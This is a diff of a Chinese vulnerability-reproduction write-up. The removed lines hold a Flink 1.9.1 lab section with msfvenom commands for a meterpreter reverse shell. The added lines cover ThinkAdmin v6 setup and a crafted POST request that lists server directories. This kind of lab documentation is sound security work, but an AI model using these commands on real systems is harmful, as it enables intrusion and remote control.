@@ -4,48 +4,62 @@
 
 漏洞复现模板如下：
 ```
-# 0x00 复现环境
-使用复现环境：本地搭建的环境  
-复现版本：Flink 1.9.1
+# 0x00 软件介绍
+基于ThinkPHP，专注于微信领域后台管理的一款开发框架
 
-# 0x01 环境搭建
-目标环境：centos7_x64_en-us + flink-1.9.1-bin-scala_2.11.tgz + openjdk version "1.8.0_181"
+# 0x01 复现环境
+使用环境：本地搭建的环境  
+复现版本：2020.08.03.1之前的某一个v6版本：https://github.com/179776823/ThinkAdmin
 
-wget https://archive.apache.org/dist/flink/flink-1.9.1/flink-1.9.1-bin-scala_2.11.tgz  
-tar -xvf ./flink-1.9.1-bin-scala_2.11.tgz  
-cd ./flink-1.9.1/bin/  
-./start-cluster.sh  
-查看端口8081是否开启，如下图  
-![image](./0.png)  
-浏览器访问，出现下图所示，表示成功启动  
-![image](./1.png)
+# 0x02 环境搭建
+目标环境：2008_r2_standard_zh-chs + phpstudy + https://github.com/179776823/ThinkAdmin
 
-# 0x02 利用条件
+composer config -g repo.packagist composer https://mirrors.aliyun.com/composer#使用阿里云的源更快一些  
+https://github.com/179776823/ThinkAdmin#下载有漏洞的v6版本到phpstudy的对应目录下  
+cd ThinkAdmin  
+composer install  
+create database admin_v6;  
+create user 'admin_v6'@'localhost' identified by 'FbYBHcWKr2';#用户名密码来自config\database.php  
+grant all on admin_v6.* to 'admin_v6'@'localhost';  
+use admin_v6;  
+source C:\phpstudy_pro\WWW\ThinkAdmin-6\admin_v6.sql;#将数据导入数据库  
+访问：http://127.0.0.1:81/ThinkAdmin-6/public/index.php  
+参考链接：  
+https://mp.weixin.qq.com/s/MjU6u_eTsdH-nwQAgbxLRw  
+https://thinkadmin.top/install  
+https://www.cnblogs.com/Dot-Boy/archive/2008/08/04/1260185.html  
+https://www.jianshu.com/p/d7b9c468f20d  
+https://github.com/xuxuedong/personal-note/tree/master/2020_10_18_%E7%BD%91%E7%AB%99%E6%90%AD%E5%BB%BA%E4%BB%8E%E5%A4%B4%E8%AE%B0%E5%BD%95
+
+# 0x03 利用条件
 无
 
-# 0x03 影响版本
-Flink <= 1.9.1
+# 0x04 影响版本
+作者原话：2020.08.03.01，≤这个版本的都有可能存在漏洞  
+参考链接：  
+https://github.com/zoujingli/ThinkAdmin/issues/244
 
-# 0x04 漏洞复现
-攻击环境：kali2020 + msf5
+# 0x05 漏洞复现
+攻击环境：Kali-Linux-2020.2-vmware-amd64 + Burp_Suite_Pro_v2020.5.1
 
-msfvenom -p java/meterpreter/reverse_tcp lhost=172.16.35.128 lport=9999 -o text.jar  
-msfconsole  
-use exploit/multi/handler  
-set payload java/meterpreter/reverse_tcp  
-set lhost 172.16.35.128  
-set lport 9999  
-run  
-浏览器访问http://172.16.35.131:8081/ 后点击下图所示  
-![image](./2.png)  
-再点击下图所示  
-![image](./3.png)  
-此时，meterpreter已经收到session，如下图  
-![image](./4.png)
+访问：http://192.168.149.133:81/ThinkAdmin-6/public/index.php/admin/login.html  
+burp抓包，将数据包修改如下：  
+```
+POST /ThinkAdmin-6/public/index.php/admin/login.html?s=admin/api.Update/node HTTP/1.1
+Host: 127.0.0.1
+Accept: */*Accept-Language: enUser-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
+Connection: close
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 22
 
-# 0x05 踩坑记录
+rules=%5B%22.%2F%22%5D
+```
+成功列出了目录，如下图  
+![image](./0.png)
+
+# 0x06 踩坑记录
 无
 
-# 0x06 参考链接
+# 0x07 参考链接
 无
 ```
